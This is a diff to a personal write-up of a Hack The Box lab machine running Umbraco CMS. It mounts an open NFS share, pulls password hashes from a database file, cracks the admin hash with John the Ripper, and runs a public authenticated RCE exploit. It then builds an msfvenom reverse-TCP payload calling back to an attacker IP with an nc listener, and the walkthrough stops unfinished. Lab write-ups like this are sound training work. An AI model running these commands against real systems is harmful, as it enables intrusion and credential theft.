@@ -113,6 +113,9 @@ Script:
   * Jeavon Leopold
   * Jeroen Breuer
 * /umbraco looks the most suspicious
+* This turns out to be a CMS and I begin to do some research on it
+* 2049/NFS - <mark style="color:yellow;">Enumerate and see if there is anything that we can access</mark>
+* 5985/WinRM - <mark style="color:yellow;">We can authenticate with hashes or creds if obtained</mark>
 
 ## Enumeration
 
@@ -146,11 +149,129 @@ Target: http://10.129.227.150/
 * /umbraco looks to be the most interesting as it is a login page
 * http://10.129.227.150/about-us/todo-list-for-the-starter-kit/ looks interesting as well. It has a to-do list in it
 
+### Port 2049 - NFS
+
+* Attempted to see if there was anything on this file share that would help us exploit the target
+
+Showmount:
+
+```
+showmount -e 10.129.60.40                                                                                         Fri 30 Sep 2022 01:43:27 PM EDT
+Export list for 10.129.60.40:
+/site_backups (everyone)
+```
+
+* We see that everyone has access to /site\_backups
+* Let's mount that to our file system and access the files
+
+Mount:
+
+```
+sudo mkdir /mnt/Remote-Backup
+
+sudo mount -t nfs 10.129.60.40:/site_backups /mnt/Remote_Backup/ -o nolock
+```
+
+Copying and accessing the file share:
+
+<pre><code><strong>mkdir nfs-loot
+</strong><strong>cp -R /mnt/Remote-Backup/* nfs-loot/
+</strong>cd nfs-loot</code></pre>
+
+* There are lots of files in here; this will take some time
+* What we are doing is looking for hard-coded credentials
+* Let's do some research on Umbraco
+
+{% embed url="https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data#comment-190162" %}
+
+* There is an .sdf file... let's try and find it
+* This can be found in the App\_Data file
+* Supposedly, the password will be hashed
+
+Running strings on /App\_Data/Umbraco.sdf:
+
+```
+Administratoradmindefaulten-US
+Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
+Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
+smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
+ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
+ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
+```
+
+* These look like SHA1 hashes
+
+{% embed url="https://our.umbraco.com/forum/core/general/53147-Questions-regarding-how-Umbraco-stores-and-hashes-passwords" %}
+
+SHA1 Hash:
+
+```
+b8be16afba8c314ad33d812f22a04991b90e2aaa
+```
+
+* I placed this hash in a text file called hash
+
+Cracking w/ John The Ripper:
+
+```
+sudo john --wordlist:/usr/share/wordlists/rockyou.txt hash
+
+baconandcheese
+```
+
+* admin@htb.local:baconandcheese
+* Navigate to the umbraco login page and login
+
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+* Here is where I asked myself the question "okay what can we do with our admin credentials in the Umbraco CMS?"
+
+Searchsploit:
+
+```
+searchsploit umbraco                                                                                              Fri 30 Sep 2022 05:00:51 PM EDT
+------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                 |  Path
+------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Umbraco CMS - Remote Command Execution (Metasploit)                                                                            | windows/webapps/19671.rb
+Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                                                     | aspx/webapps/46153.py
+Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)                                                                     | aspx/webapps/49488.py
+Umbraco CMS 8.9.1 - Directory Traversal                                                                                        | aspx/webapps/50241.py
+Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting                                                                     | php/webapps/44988.txt
+Umbraco v8.14.1 - 'baseUrl' SSRF
+```
+
+* We have credentials, so I instantly identify the Authenticated RCE's&#x20;
+* I choose to use the <mark style="color:yellow;">49488.py</mark> exploit
+
 ## Exploitation
 
-### Name of the technique
+### 49488.py
 
-This is the exploit
+Finding a writeable directory:
+
+```
+python 49488.py -u admin@htb.local -p baconandcheese -i 'http://10.129.60.40' -c powershell.exe -a "ls C:/" 
+```
+
+Creating payload w/ msfvenom:
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.2 LPORT=1337 -f exe > rev.exe
+```
+
+Start nc listener:
+
+```
+nc -lnvp 1337
+```
+
+Start HTTP server for file transfer:
+
+```
+```
 
 ## Privilege Escalation
 
